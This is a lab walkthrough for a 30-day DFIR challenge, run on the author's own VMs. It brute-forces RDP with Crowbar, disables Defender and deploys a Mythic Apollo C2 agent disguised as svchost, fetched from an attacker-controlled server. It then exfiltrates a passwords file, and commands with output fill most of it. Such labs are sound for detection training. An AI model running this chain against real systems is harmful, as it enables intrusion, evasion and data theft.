## Day 21 - Mythic Agent Setup Tutorial
**Objective:  Learn how to perform a brute force attack, generate a Mythic agent and establish C2.**

The first thing we're going to do is change our password on the Windows VM to something that won't take hours to brute force as this challenge is for learning purposes.  We'll console into our Windows VM.  We'll need to make some policy changes first before it accepts an easier password.  We'll open up the "Local Group Policy Editor" by searching in the start menu for "Edit Group Policy".  Once open we'll drill down to the following:
- Windows Settings
- Security Settings
- Account Policies
- Password Policy

We'll change "**Minimum password length**" to "**5**" and "**password must meet complexity requirements**" to "**Disabled**"

![Windows Local Groupp Policy Editor](https://github.com/user-attachments/assets/3c7b9e00-ad9d-4d8c-85b8-3ca9dea8e73d)

Now in the start menu we'll click on the user name "Administrator" at the top of the first column and select "Change account settings".  On the next window we'll click on "Sign-in-options".  Under the "Password" option we'll click on "Change".  Enter in your current password and then change it to something simple like the video "Winter2024!" if you like.

Next we'll add this new password into a text file in the Documents folders and name the file "passwords.txt".

Now we're ready to peform our attack plan from the attack diagram we created on Day 19.  We'll log into our Kali VM and open a terminal.  The first thing we need to do is update our Kali:
```
sudo apt update && sudo apt upgrade -y
```
Let's navigate to the following directory where the built in wordlists are found on Kali Linux:
```
cd /usr/share/wordlists
```
The most common wordlist is rockyou.txt which we have here but it is in a gzip format so we'll unzip it with:
```
sudo gunzip rockyou.txt.gz
```
And enter in your password.

![Kali - unzip rockyou.txt.gz](https://github.com/user-attachments/assets/aa2234b7-6023-4e4d-8bdb-a43a9494310e)

Because this is such a large file we're just going to copy the first 50 passwords into a new file for us to brute force with.
```
head -50 rockyou.txt > home/kali/mydfir-wordlist.txt
```
Now we'll add our Windows password to our new list in our home directory by the following commands.

`cd` and `nano mydfir-wordlist.txt`

At the bottom of the wordlist we'll add in our new Windows password and we'll exit with ctrl+x, Y, and, hit the enter key.

Next we're going to install a tool call 'Crowbar":
```
sudo apt install crowbar
```
Once installed we can see all of Crowbar's options with `crowbar -h`.  


**Phase 1 - Initial Attack**

Create a text file called target.txt and enter in your Windows VM IP address:
```
echo <Your Windows VM IP> > target.txt && echo Administrator >> target.txt
```
**PLEASE NOTE** - Please only use crowbar for targets that you own (Like in this lab) or for targets you have explixit permission to do so on.

We'll use the following command to execute Crowbar.
```
crowbar -b rdp -u Administrator -C mydfir-wordlist.txt -s <Your Windows VM IP>/32
```
- **-b**: is brute force with RDP.
- **-u**: is for user.  In our case Administrator.
- **-C**: is for the wordlist file we want crowbar to use which is mydfir-wordlist.txt.
- **-s**: is for the server we're pointing it to which is our Windows Server VM.

We also added a **CIDR notation** or **slash notation** of /32 which specifies the size of the subnet we want to scan.  More info aboiut this can be found below.

[Amazon Web Services - What is CIDR?](https://aws.amazon.com/what-is/cidr/)

```
──(kali㉿kali)-[~]
└─$ crowbar -b rdp -u Administrator -C mydfir-wordlist.txt -s <Your Win VM IP>/32
2024-09-23 14:12:23 START
2024-09-23 14:12:23 Crowbar v0.4.2
2024-09-23 14:12:23 Trying <Your Win VM IP>:3389
2024-09-23 14:12:33 RDP-SUCCESS : <Your Win VM IP>:3389 - Administrator:<YOUR WIN VM password>
2024-09-23 14:12:33 STOP
```

Now that we have the credentials as the attacker we can use a tool called "xfreerdp" to connect to the server.
```
xfreerdp /u:Administrator /p:<Your WIN password> /v:<Your WIN IP>:3389
```
It will ask you if you trust the certificate.  We'll enter "Y".  And just like they say in the movies "I'm in!".

![Kali xfreerdp session](https://github.com/user-attachments/assets/ad9e59b6-6720-4544-8fb1-7790d95abbc0)


**Phase 2 - Discovery**

We can now open a command prompt (click start and start typing 'command') and we can run the commands Phase 2 commands from our attack diagram.

**whoami**
```
mydfir-win-(Your handle)\administrator
```

**ipconfig**
```
Windows IP Configuration


Ethernet adapter Ethernet Instance 0:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : (Win VM IPv6)
   IPv4 Address. . . . . . . . . . . : (Win VM IPv4)
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : (Win VM IP Gateway)
```

**net user**
```
User accounts for \\MYDFIR-WIN-(Your handle)

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
WDAGUtilityAccount
The command completed successfully.
```

**net group**
```
This command can be used only on a Windows Domain Controller.

More help is available by typing NET HELPMSG 3515.
```

A bonus command

**net user administrator**
```
User name                    Administrator
Full Name
Comment                      Built-in account for administering the computer/domain
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            9/23/2024 5:10:22 PM
Password expires             Never
Password changeable          9/23/2024 5:10:22 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   9/23/2024 6:21:04 PM

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *None
The command completed successfully.
```

"net user (user name)" is more useful when you first game access and you want to know what groups the user is associalated with in order to start escalating your privillages as you normally wouldn't gain admin rights on the first attempt.  However, this command will help with our telemetry.


**Phase 3 - Defense Evasion**

Normally, we could enter in a Powershell command to peform this but for simplicity we'll just disable it in the Security settings.  Click start and search for `Windows Security`.  click on "Virus & threat protection" and the "Manage settiings" option.  And we'll just diable all four of the options on this page.
- Real-time protection
- Could-delivered protection
- Automatic sample submission
- Tamper Protection

![Windows Defender - Virus & threat protection settings](https://github.com/user-attachments/assets/3887c63f-27bb-418b-ba42-4e4d5b97e62b)


**Phase 4 - Execution**

Now it's time to build our Mythic Agent.  Let's log into out Mythic instance we created on Day 21 with the Mythic dashboard and an SSH instance on your host PC.

Here is a list of Mythic Agents and which ones are avaialble for each type of OS and their C2 Profile availablility:

[https://mythicmeta.github.io/overview/agent_matrix.html](https://mythicmeta.github.io/overview/agent_matrix.html)

For this challenge we're going to be using **Apollo**.  We'll run the following in our CLI to install Apollo:
```
./mythic-cli install github https://github.com/MythicAgents/Apollo.git
```
You should now see an Apollo agent in the "C2 Services & Payload types" (The headphone icon) section of your Mythic dashboard.

![Mythic Dashboard - Apollo agent](https://github.com/user-attachments/assets/101a458f-2376-4ddc-8102-e5fd778f784f)

We'll also look up a list of Mythic C2 Profiles:

[https://github.com/MythicC2Profiles](https://github.com/MythicC2Profiles)

For this challenge we're going to be using "HTTP".  On the CLI for Mythic we'll run the following to install the HTTP C2 profile:
```
./mythic-cli install github https://github.com/MythicC2Profiles/http
```
And now you should see the HTTP C2 Profile on your Mythic dashboard in the same ""C2 Services & Payload types" section.

![Mythic Dashboard - HTTP C2 Profile](https://github.com/user-attachments/assets/60b4d7cf-62f8-419c-aaf5-343d16bd3e40)

To create a payload we'll go into the "biohazard" icon for payloads on our Mythic dashboard and we can clicl on the "Actions" button on the right hand side and select "Generate New Payload".

![Mythic Dashboard - Payload - Actions - Generate New Payload](https://github.com/user-attachments/assets/2167c39f-6e18-4ca4-813b-9ff0aa85b779)

**Select Target Operating System**

Select "Windows" as your target Operating System and click on the "Next" button at the bottom.  

**Select Target Payload Type**

We'll leave the value as default "WinExe".  You can also select different payload options if you have more than one agent but since we only have "apollo" we'll click on the "Next" button.

**Select Commands**

You can customize your Agent with the commands you want to make the payload as small or large as you want.  For educational purpose we'll add them all to the right hand side under "Commands Included" using the double arrow button poiting to the right.

There is also a "DOCUMENTAITON" button at the bottom right hand corner which will go into more detail about all of the commands.  Definitely worth a read.

We'll click on the "Next" button.

**Select C2 Profiles**

Enable the "http" toggle option to include this profile.  For the "**Callback Host**" Parameter we'll change this to "http and change this to our Mythic Server IP found in your VULTR or cloud provider you're using.  Everything else can be left as default and we'll click on the "Next" button.

**Payload Review**
If you are participating in the 30 day challenge you'll need to change the **apollo.exe** to the following:
```
svchost-(Your Handle).exe
```
And we can give it a despription of:
```
MyDFIR 30 Day Challenge Payload/Agent
```
Once the payload has completed it's build process you can right click on the "Download here" link and paste it on your notepad for later.

Now let's see if we can make the payload a bit smaller and easier to use.  We'll run the following with our payload link in our Mythic CLI:
```
wget (Your payload link) --no-check-certificate
```
Now when we run the "file" command on the new file it created it shows the following:
```
file <your file name>
<Your file name>: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
```
Now we can mimply rename the file:
```
mv <Your file name> svchost-<Your handle>.exe
```
Now we can create a directlory named something small like the number 1 and move our payload there.
```
mkdir 1
mv svchost-(Your handle).exe 1/
cd 1
ls
```
Next we'll open up some ports on our Mythic VM's firewall and then start up a simple python server from the Mythic CLI:
```
ufw allow 80
ufw allow 9999
python3 -m http.server 9999
```

**Phase 5 Command & Control**

Now if we go over to our Kali RDP session we'll open up a Powershell with Admin (right click start and select Windows PowerShell (Admin) and we'll run the following command:
```
Invoke-WebRequest -Uri http://(Your Mythic VM IP):9999/svchost-(Your Handle.exe -OutFile "C:\Users\Public\Downloads\svchost-(Your Handle).exe"
```
If we run a netstat on our Kali RDP session, in a new PowerShell session we can see that our payload has established a session.
```
netstat -anob

...
TCP    <Your WIN VM IP>:62483    <Your Mythic VM IP>:80      ESTABLISHED     7500
 [svchost-<Your Handle>.exe]
```

Under the "Active Callbacks" tab (the telephone icon) on our Mythic dashboard we cab see ab estaablished connection.

![Mythic Dashboard - Callback tab](https://github.com/user-attachments/assets/e323fe50-0984-4268-b0fc-03f0d244e341)

If you click on the small red keyboard icon under the "Interact" column we can run the same commands from here that we did on our RDP session.

![Mythic Dashboard - Callback tab - Running agent commands](https://github.com/user-attachments/assets/7f924db0-6378-4430-b08c-2a39f38409a7)

You can find the commands under the Help menu at the top right hand corner of your Mythic dashboard for "Agent Documentation".

![Mythic Dashboard - Help Menu - Agent Documentation](https://github.com/user-attachments/assets/3256a958-348e-41f9-be92-d42e4cb3152b)

![Mythic Dashboard- Agent Documentation](https://github.com/user-attachments/assets/457a0462-3692-43b4-804a-59493cee94a1)


**Phase 6 Exfiltration**

Let's attempt to extract the "passwords.txt" file from the Windows VM we created in the Aministrators Documents folder from our C2.  The Mythic command documentation shows a download option we can use.

![Mythic command documentation for Download](https://github.com/user-attachments/assets/bd5232d3-2b78-42e4-a285-db56361be67b)

Let's try running the floowing on the "Callbacks" tab of our Mythic dashboard:
```
download C:\Users\Administrator\Documents\passwords.txt
```
And if the path is correct is should show on the dashboard it was extracted and even display the contacts of the file (blanked out for security purposes).

![Mythic dashboard - Call back tab - Download command results5](https://github.com/user-attachments/assets/2a426fb6-a120-491a-ac1e-6e8b23b8c1f6)

the file will be shown under the "File" tab (The paperclip icon).  You can even click on the down arrow under the "More" column which shows you the hashes for the passwords.txt file.

![Mythic dashboard - File tab - Downoaded file display with More display option (hashes)](https://github.com/user-attachments/assets/526e72c3-43d6-422f-9e42-6e22e559da01)
